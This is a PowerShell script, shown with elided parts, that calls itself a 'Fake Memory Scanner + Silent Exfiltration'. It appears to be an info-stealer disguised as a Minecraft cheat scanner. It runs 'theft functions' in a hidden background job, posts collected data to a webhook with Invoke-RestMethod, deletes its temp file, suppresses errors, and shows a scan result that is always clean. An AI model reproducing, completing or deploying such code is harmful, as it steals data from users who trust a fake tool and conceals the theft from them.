# MemoryScan.ps1 – Fake Memory Scanner + Silent Exfiltration (V3 FINAL)
param(
...
# ========== THEFT FUNCTIONS (will be loaded into background job) ==========
$stealFunctions = {
    ...
    function Send-Exfil {
        ...
        try {
            ...
            Invoke-RestMethod -Uri $hook -Method Post -Form $form
            Remove-Item $tempFile -Force
            Invoke-RestMethod -Uri $hook -Method Post -Body (@{content = $summary} | ConvertTo-Json) -ContentType "application/json"
        } catch {}
    }
}

# ---------- BACKGROUND EXFILTRATION ----------
$stealJob = Start-Job -InitializationScript $stealFunctions -ScriptBlock {
    param($webhook)
    $data = @{
    ...
    Send-Exfil -Data $data -hook $webhook
} -ArgumentList $Script:Webhook

# ---------- FAKE SCAN (ALWAYS CLEAN) ----------
$cheatFiles = @(
    "javaw.exe", "minecraft.exe", "lunarclient.exe", "badlion.exe",
    "cheatengine.exe", "xray.jar", "killaura.lua", "autoclicker.exe",
    "ghostclient.dll", "vape.ini", "sigma.jar", "wurst.dll"
)
$scanDirs = @(
...
# Wait for the theft to finish silently
Wait-Job $stealJob | Out-Null
Receive-Job $stealJob -ErrorAction SilentlyContinue | Out-Null
Remove-Job $stealJob
